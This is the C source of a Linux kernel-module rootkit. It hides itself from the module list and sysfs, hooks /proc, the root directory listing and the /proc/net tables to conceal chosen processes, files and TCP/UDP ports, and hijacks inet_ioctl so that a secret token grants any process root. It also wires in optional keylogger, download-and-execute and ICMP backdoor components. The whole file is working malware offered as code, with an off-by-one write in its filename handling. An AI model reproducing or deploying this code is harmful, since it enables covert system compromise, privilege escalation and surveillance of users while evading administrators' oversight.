#include "common.h"
#include <linux/capability.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>

#define TMPSZ 150

static int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);
static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);
static int (*o_proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*root_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);

unsigned long *sys_call_table;
unsigned long *ia32_sys_call_table;

struct s_proc_args {
    unsigned short pid;
};

struct s_port_args {
    unsigned short port;
};

struct s_file_args {
    char *name;
    unsigned short namelen;
};

struct s_args {
    unsigned short cmd;
    void *ptr;
};

struct hidden_port {
    unsigned short port;
    struct list_head list;
};

LIST_HEAD(hidden_tcp4_ports);
LIST_HEAD(hidden_tcp6_ports);
LIST_HEAD(hidden_udp4_ports);
LIST_HEAD(hidden_udp6_ports);

struct hidden_proc {
    unsigned short pid;
    struct list_head list;
};

LIST_HEAD(hidden_procs);

struct hidden_file {
    char *name;
    struct list_head list;
};

LIST_HEAD(hidden_files);

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

#if defined(_CONFIG_X86_)
// Phrack #58 0x07; sd, devik
unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[255];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

    if ( p )
        return *(unsigned long **)((char *)p + 3);
    else
        return NULL;
}
#elif defined(_CONFIG_X86_64_)
// http://bbs.chinaunix.net/thread-2143235-1-1.html
unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}

// Obtain sys_call_table on amd64; pouik
unsigned long *find_ia32_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 16 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}
#else // ARM
// Phrack #68 0x06; dong-hoon you
unsigned long *find_sys_call_table ( void )
{
	void *swi_addr = (long *)0xffff0008;
	unsigned long offset, *vector_swi_addr;

	offset = ((*(long *)swi_addr) & 0xfff) + 8;
	vector_swi_addr = *(unsigned long **)(swi_addr + offset);

	while ( vector_swi_addr++ )
		if( ((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000 )
        {
			offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
			return vector_swi_addr + offset;
		}

	return NULL;
}
#endif

void *get_inet_ioctl ( int family, int type, int protocol )
{
    void *ret;
    struct socket *sock = NULL;

    if ( sock_create(family, type, protocol, &sock) )
        return NULL;

    ret = sock->ops->ioctl;

    sock_release(sock);

    return ret;
}

void *get_vfs_readdir ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->readdir;

    filp_close(filep, 0);

    return ret;
}

void *get_vfs_read ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->read;

    filp_close(filep, 0);

    return ret;
}

void *get_tcp_seq_show ( const char *path )
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    afinfo = PDE(filep->f_dentry->d_inode)->data;
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

void *get_udp_seq_show ( const char *path )
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    afinfo = PDE(filep->f_dentry->d_inode)->data;
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

void hide_tcp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp4_ports);
}

void unhide_tcp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_tcp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp6_ports);
}

void unhide_tcp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_udp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_udp4_ports);
}

void unhide_udp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_udp4_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_udp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_udp6_ports);
}

void unhide_udp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_udp6_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

void unhide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    list_for_each_entry ( hp, &hidden_procs, list )
    {
        if ( pid == hp->pid )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_file ( char *name )
{
    struct hidden_file *hf;

    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if ( ! hf )
        return;

    hf->name = name;

    list_add(&hf->list, &hidden_files);
}

void unhide_file ( char *name )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
    {
        if ( name == hf->name )
        {
            list_del(&hf->list);
            kfree(hf->name);
            kfree(hf);
            break;
        }
    }
}

static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack_resume(tcp4_seq_show);

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hijack_resume(tcp6_seq_show);

    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hijack_resume(udp4_seq_show);

    list_for_each_entry ( hp, &hidden_udp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hijack_resume(udp6_seq_show);

    list_for_each_entry ( hp, &hidden_udp6_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
        if ( ! strcmp(name, hf->name) )
            return 0;

    return o_root_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_root_readdir ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    if ( ! file || ! file->f_vfsmnt ) // XXX is this necessary?
        return 0;

    o_root_filldir = filldir;

    hijack_pause(root_readdir);
    ret = root_readdir(file, dirent, &n_root_filldir);
    hijack_resume(root_readdir);

    return ret;
}

static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list )
        if ( pid == hp->pid )
            return 0;

    return o_proc_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_proc_readdir ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    o_proc_filldir = filldir;

    hijack_pause(o_proc_readdir);
    ret = o_proc_readdir(file, dirent, &n_proc_filldir);
    hijack_resume(o_proc_readdir);

    return ret;
}

static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
{
    int ret;
    struct s_args args;

    if ( cmd == AUTH_TOKEN )
    {
        #if __DEBUG__
        printk("Authenticated, receiving command\n");
        #endif

        ret = copy_from_user(&args, (void *)arg, sizeof(args));
        if ( ret )
            return 0;

        switch ( args.cmd )
        {
            /* Upgrade privileges of current process */
            case 0:
                #if __DEBUG__
                printk("Elevating privileges of PID %hu\n", current->pid);
                #endif

                #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
                current->uid   = 0;
                current->suid  = 0;
                current->euid  = 0;
                current->gid   = 0;
                current->egid  = 0;
                current->fsuid = 0;
                current->fsgid = 0;
                cap_set_full(current->cap_effective);
                cap_set_full(current->cap_inheritable);
                cap_set_full(current->cap_permitted);
                #else
                commit_creds(prepare_kernel_cred(0));
                #endif
                break;

            /* Hide process */
            case 1:
                {
                    struct s_proc_args proc_args;

                    ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding PID %hu\n", proc_args.pid);
                    #endif

                    hide_proc(proc_args.pid);
                }
                break;

            /* Unhide process */
            case 2:
                {
                    struct s_proc_args proc_args;

                    ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding PID %hu\n", proc_args.pid);
                    #endif

                    unhide_proc(proc_args.pid);
                }
                break;

            /* Hide TCPv4 port */
            case 3:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding TCPv4 port %hu\n", port_args.port);
                    #endif

                    hide_tcp4_port(port_args.port);
                }
                break;

            /* Unhide TCPv4 port */
            case 4:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding TCPv4 port %hu\n", port_args.port);
                    #endif

                    unhide_tcp4_port(port_args.port);
                }
                break;

            /* Hide TCPv6 port */
            case 5:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding TCPv6 port %hu\n", port_args.port);
                    #endif

                    hide_tcp6_port(port_args.port);
                }
                break;

            /* Unhide TCPv6 port */
            case 6:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding TCPv6 port %hu\n", port_args.port);
                    #endif

                    unhide_tcp6_port(port_args.port);
                }
                break;

            /* Hide UDPv4 port */
            case 7:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding UDPv4 port %hu\n", port_args.port);
                    #endif

                    hide_udp4_port(port_args.port);
                }
                break;

            /* Unhide UDPv4 port */
            case 8:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding UDPv4 port %hu\n", port_args.port);
                    #endif

                    unhide_udp4_port(port_args.port);
                }
                break;

            /* Hide UDPv6 port */
            case 9:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Hiding UDPv6 port %hu\n", port_args.port);
                    #endif

                    hide_udp6_port(port_args.port);
                }
                break;

            /* Unhide UDPv6 port */
            case 10:
                {
                    struct s_port_args port_args;

                    ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
                    if ( ret )
                        return 0;

                    #if __DEBUG__
                    printk("Unhiding UDPv6 port %hu\n", port_args.port);
                    #endif

                    unhide_udp6_port(port_args.port);
                }
                break;

            /* Hide file/directory */
            case 11:
                {
                    char *name;
                    struct s_file_args file_args;

                    ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
                    if ( ret )
                        return 0;

                    name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
                    if ( ! name )
                        return 0;

                    ret = copy_from_user(name, file_args.name, file_args.namelen);
                    if ( ret )
                    {
                        kfree(name);
                        return 0;
                    }

                    name[file_args.namelen+1] = 0;

                    #if __DEBUG__
                    printk("Hiding file/dir %s\n", name);
                    #endif

                    hide_file(name);
                }
                break;

            /* Unhide file/directory */
            case 12:
                {
                    char *name;
                    struct s_file_args file_args;

                    ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
                    if ( ret )
                        return 0;

                    name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
                    if ( ! name )
                        return 0;

                    ret = copy_from_user(name, file_args.name, file_args.namelen);
                    if ( ret )
                    {
                        kfree(name);
                        return 0;
                    }

                    name[file_args.namelen + 1] = 0;

                    #if __DEBUG__
                    printk("Unhiding file/dir %s\n", name);
                    #endif

                    unhide_file(name);

                    kfree(name);
                }
                break;

            default:
                break;
        }

        return 0;
    }

    hijack_pause(inet_ioctl);
    ret = inet_ioctl(sock, cmd, arg);
    hijack_resume(inet_ioctl);

    return ret;
}

static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
{
    /* Hide LKM and all symbols */
    list_del_init(&__this_module.list);

    /* Hide LKM from sysfs */
    kobject_del(__this_module.holders_dir->parent);

    #if defined(_CONFIG_X86_64_)
    ia32_sys_call_table = find_ia32_sys_call_table();
        #if __DEBUG__
    printk("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
        #endif
    #endif

    sys_call_table = find_sys_call_table();

    #if __DEBUG__
    printk("sys_call_table obtained at %p\n", sys_call_table);
    #endif

    /* Hook /proc for hiding processes */
    o_proc_readdir = get_vfs_readdir("/proc");
    hijack_start(o_proc_readdir, &n_proc_readdir);

    /* Hook / for hiding files and directories */
    root_readdir = get_vfs_readdir("/");
    hijack_start(root_readdir, &n_root_readdir);

    /* Hook /proc/net/tcp for hiding tcp4 connections */
    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    hijack_start(tcp4_seq_show, &n_tcp4_seq_show);

    /* Hook /proc/net/tcp6 for hiding tcp6 connections */
    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
    hijack_start(tcp6_seq_show, &n_tcp6_seq_show);

    /* Hook /proc/net/udp for hiding udp4 connections */
    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
    hijack_start(udp4_seq_show, &n_udp4_seq_show);

    /* Hook /proc/net/udp6 for hiding udp4 connections */
    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
    hijack_start(udp6_seq_show, &n_udp6_seq_show);

    /* Hook inet_ioctl() for rootkit control */
    inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    hijack_start(inet_ioctl, &n_inet_ioctl);

    #if defined(_CONFIG_KEYLOGGER_)
    keylogger_init();
    #endif

    #if defined(_CONFIG_HOOKRW_)
    hookrw_init();
    #endif

    #if defined(_CONFIG_DLEXEC_)
    dlexec_init();
    #endif

    #if defined(_CONFIG_ICMP_)
    icmp_init();
    #endif

    return 0;
}

static void __exit mischief_managed ( void )
{
    #if defined(_CONFIG_ICMP_)
    icmp_exit();
    #endif

    #if defined(_CONFIG_DLEXEC_)
    dlexec_exit();
    #endif

    #if defined(_CONFIG_HOOKRW_)
    hookrw_exit();
    #endif

    #if defined(_CONFIG_KEYLOGGER_)
    keylogger_exit();
    #endif

    hijack_stop(inet_ioctl);
    hijack_stop(udp6_seq_show);
    hijack_stop(udp4_seq_show);
    hijack_stop(tcp6_seq_show);
    hijack_stop(tcp4_seq_show);
    hijack_stop(root_readdir);
    hijack_stop(o_proc_readdir);
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");
